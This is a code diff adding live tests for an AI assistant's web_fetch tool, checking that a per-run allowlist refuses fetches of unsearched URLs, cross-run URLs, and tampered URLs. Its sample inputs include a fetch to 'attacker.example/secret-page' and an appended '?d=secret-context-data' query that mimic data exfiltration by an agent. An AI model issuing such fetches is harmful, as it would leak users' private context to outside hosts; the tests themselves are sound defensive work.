@@ -250,9 +250,12 @@ const {
   HEAVY_MODEL_DEFAULT,
 } = await import("../src/lib/assistant/agent");
 const { buildVassiliSystemPrompt } = await import("../src/lib/assistant/prompt");
-const { webSearchEnabled, WEB_SEARCH_DISABLED_MESSAGE } = await import(
-  "../src/lib/assistant/ollama-search"
-);
+const {
+  webSearchEnabled,
+  WEB_SEARCH_DISABLED_MESSAGE,
+  WEB_FETCH_NOT_ALLOWLISTED_MESSAGE,
+  createWebFetchAllowlist,
+} = await import("../src/lib/assistant/ollama-search");
 const { listOrders, getOrder } = await import("../src/lib/orders");
 const { listOutOfOffice, deleteOutOfOffice, listOwnerBookings } = await import(
   "../src/lib/admin/cal"
@@ -2486,16 +2489,91 @@ try {
     );
 
     if (enabled) {
+      // A per-run allowlist ctx — web_search populates it, web_fetch is gated
+      // to it (anti-exfiltration). Exactly how the agent loop wires it.
+      const runCtx = {
+        chatId: OWNER_CHAT,
+        webFetchAllowlist: createWebFetchAllowlist(),
+      };
       const sr = await executeTool(
         "web_search",
         { query: "onmacabim official site" },
-        ctx
+        runCtx
       );
       console.log("--- web_search (live) ---\n" + sr.slice(0, 500));
       check(
         "web_search returned real results (a URL, not the disabled message)",
         /https?:\/\//.test(sr) && sr !== WEB_SEARCH_DISABLED_MESSAGE,
         sr.slice(0, 160)
+      );
+
+      // Pull the first surfaced URL out of the formatted results.
+      const surfaced = (sr.match(/https?:\/\/\S+/) || [])[0] || "";
+      check(
+        "web_search surfaced at least one fetchable URL + recorded it",
+        Boolean(surfaced) && runCtx.webFetchAllowlist.size() > 0,
+        `surfaced=${surfaced.slice(0, 80)} size=${runCtx.webFetchAllowlist.size()}`
+      );
+
+      // (a) web_fetch of a URL a PRIOR web_search surfaced this run → permitted
+      // by the allowlist (i.e. NOT refused with the not-allowlisted message).
+      const fa = await executeTool("web_fetch", { url: surfaced }, runCtx);
+      console.log("--- web_fetch allowlisted (live) ---\n" + fa.slice(0, 300));
+      check(
+        "(a) web_fetch of a prior search-result URL is allowed (not refused)",
+        fa !== WEB_FETCH_NOT_ALLOWLISTED_MESSAGE &&
+          fa !== WEB_SEARCH_DISABLED_MESSAGE,
+        fa.slice(0, 160)
+      );
+
+      // (b) web_fetch of an arbitrary URL NOT from any search → refused.
+      const fb = await executeTool(
+        "web_fetch",
+        { url: "https://attacker.example/secret-page" },
+        runCtx
+      );
+      check(
+        "(b) web_fetch of a never-searched URL is refused (anti-exfil)",
+        fb === WEB_FETCH_NOT_ALLOWLISTED_MESSAGE,
+        fb.slice(0, 160)
+      );
+
+      // (c) web_fetch of an allowlisted host with an APPENDED query string
+      // (?d=<exfil>) → refused. This is the core data-exfiltration block.
+      let tampered = "";
+      try {
+        const u = new URL(surfaced);
+        tampered = `${u.origin}${u.pathname}?d=secret-context-data`;
+      } catch {
+        tampered = "https://example.com/?d=secret-context-data";
+      }
+      const fc = await executeTool("web_fetch", { url: tampered }, runCtx);
+      check(
+        "(c) allowlisted host + appended ?d=<data> query is refused (exfil block)",
+        fc === WEB_FETCH_NOT_ALLOWLISTED_MESSAGE,
+        fc.slice(0, 160)
+      );
+
+      // (d) cross-run isolation: the surfaced URL is NOT fetchable from a
+      // DIFFERENT run's allowlist.
+      const otherRunCtx = {
+        chatId: OWNER_CHAT,
+        webFetchAllowlist: createWebFetchAllowlist(),
+      };
+      const fd = await executeTool("web_fetch", { url: surfaced }, otherRunCtx);
+      check(
+        "(d) cross-run isolation: a URL from another run is refused",
+        fd === WEB_FETCH_NOT_ALLOWLISTED_MESSAGE,
+        fd.slice(0, 160)
+      );
+
+      // web_fetch with NO allowlist on ctx (e.g. the confirm-callback path)
+      // can open nothing — refused even though web search is enabled.
+      const fe = await executeTool("web_fetch", { url: surfaced }, ctx);
+      check(
+        "web_fetch with no run allowlist is refused (callback-path default)",
+        fe === WEB_FETCH_NOT_ALLOWLISTED_MESSAGE,
+        fe.slice(0, 160)
       );
     } else {
       const sr = await executeTool(
